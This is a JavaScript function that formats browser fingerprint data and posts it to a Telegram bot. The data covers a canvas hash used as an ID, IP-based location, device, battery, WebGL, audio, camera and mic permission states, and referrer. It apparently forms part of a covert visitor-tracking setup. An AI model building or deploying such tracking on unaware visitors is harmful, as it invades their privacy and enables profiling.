export async function notifyTelegram(data, shouldNotify = false) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  const device = data.userAgent?.split(')')[0]?.replace('(', '').slice(0, 50) || 'unknown';
  const location = `${data.ipInfo?.city || 'Unknown'}, ${data.ipInfo?.country || 'Unknown'}`;
  const id = data.canvasHash || '???????';

  const msg = `
🎯 ID: ${id}
📍 ${location}
📱 ${device}
🧭 Timezone: ${data.timezone}
🔋 Battery: ${data.battery?.level ?? 'n/a'}${data.battery?.charging ? ' ⚡' : ''}
🎛 Audio: ${data.audioSampleRate || 'n/a'} Hz
🎨 WebGL: ${data.webglRenderer || 'unknown'}
🎥 Camera: ${data.permissions?.camera}
🎙 Mic: ${data.permissions?.microphone}
🔗 Referrer: ${data.referrer || 'n/a'}
🔑 Sig: ${data.sig || 'n/a'}
`;

  console.log('[notify] Sending message:', msg);

  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: msg,
      disable_notification: !shouldNotify
    })
  });

  console.log('[notify] Response:', response.status);
}